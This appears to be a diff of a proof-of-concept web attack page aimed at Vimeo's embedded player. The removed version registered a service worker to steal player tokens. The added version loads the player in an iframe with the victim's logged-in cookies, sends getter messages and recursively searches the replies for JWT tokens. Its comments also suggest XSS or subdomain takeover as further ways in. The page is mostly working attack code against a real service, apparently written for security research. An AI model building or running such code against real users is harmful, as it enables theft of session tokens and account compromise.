@@ -1,40 +1,89 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Service Worker Attack</title>
-</head>
 <body>
-    <h1>Service Worker Token Theft</h1>
-    <button onclick="registerSW()">1. Register Service Worker</button>
-    <button onclick="loadVimeo()">2. Load Vimeo (after SW registered)</button>
-    <iframe id="vimeo" style="width:640px;height:360px"></iframe>
+    <h1>Authenticated iframe Attack</h1>
+    
+    <!-- Instructions -->
+    <div style="background: yellow; padding: 20px;">
+        <h2>Steps:</h2>
+        <ol>
+            <li>First, log into Vimeo in THIS SAME BROWSER</li>
+            <li>Then click "Load Authenticated Player" below</li>
+            <li>The iframe will load with YOUR cookies</li>
+            <li>We'll extract the token from the authenticated session</li>
+        </ol>
+    </div>
+
+    <button onclick="attack()">Load Authenticated Player</button>
+    <iframe id="vimeo" width="640" height="360"></iframe>
+    <div id="log"></div>
 
     <script>
-        async function registerSW() {
-            try {
-                // Register service worker
-                const reg = await navigator.serviceWorker.register('/sw.js');
-                console.log('✅ Service Worker registered:', reg);
-                alert('Service Worker registered. Now click "Load Vimeo"');
-            } catch (e) {
-                console.error('❌ SW registration failed:', e);
-            }
-        }
-
-        function loadVimeo() {
-            document.getElementById('vimeo').src = 
-                'https://player.vimeo.com/video/935884964';
-        }
-
-        // Listen for messages from service worker
-        navigator.serviceWorker.addEventListener('message', (event) => {
-            console.log('Message from SW:', event.data);
+        function attack() {
+            const iframe = document.getElementById('vimeo');
             
-            if (event.data.type === 'TOKEN_FOUND') {
-                console.log('🚨 TOKEN STOLEN:', event.data.token);
-                alert('TOKEN STOLEN: ' + event.data.token);
+            // Load player - it will use YOUR cookies automatically
+            iframe.src = 'https://player.vimeo.com/video/935884964?background=1';
+            
+            setTimeout(() => {
+                // The playerConfig in the iframe contains YOUR token
+                // But we can't access it due to same-origin policy
+                
+                // However, we CAN do this on vimeo.com subdomains
+                // if we find XSS or subdomain takeover
+                
+                console.log('If this page was on a vimeo.com subdomain,');
+                console.log('we could access: iframe.contentWindow.playerConfig');
+                
+                // Let's try alternatives
+                tryExtraction();
+            }, 3000);
+        }
+
+        function tryExtraction() {
+            const iframe = document.getElementById('vimeo');
+            
+            // Method 1: Check for data in postMessage responses
+            window.addEventListener('message', (e) => {
+                if (e.origin === 'https://player.vimeo.com') {
+                    console.log('Checking message for sensitive data:', e.data);
+                    
+                    // Recursively search for tokens
+                    findTokens(e.data, 'root');
+                }
+            });
+            
+            // Method 2: Request every possible getter
+            const getters = [
+                'getVideoUrl', 'getVideoEmbedCode', 'getVideoId',
+                'getCurrentTime', 'getDuration', 'getVolume',
+                // ... all others from the error message
+            ];
+            
+            getters.forEach((method, i) => {
+                setTimeout(() => {
+                    iframe.contentWindow.postMessage({method}, '*');
+                }, i * 50);
+            });
+        }
+
+        function findTokens(obj, path) {
+            if (typeof obj === 'string') {
+                // Check for JWT pattern
+                if (/^eyJ[A-Za-z0-9-_]+\./.test(obj)) {
+                    console.log(`🚨 POTENTIAL JWT at ${path}:`, obj);
+                    document.getElementById('log').innerHTML += 
+                        `<div style="background:red;color:white;padding:10px">
+                            <strong>JWT FOUND at ${path}:</strong><br>
+                            <code>${obj}</code>
+                        </div>`;
+                }
+            } else if (obj && typeof obj === 'object') {
+                for (let key in obj) {
+                    findTokens(obj[key], `${path}.${key}`);
+                }
             }
-        });
+        }
     </script>
 </body>
 </html>
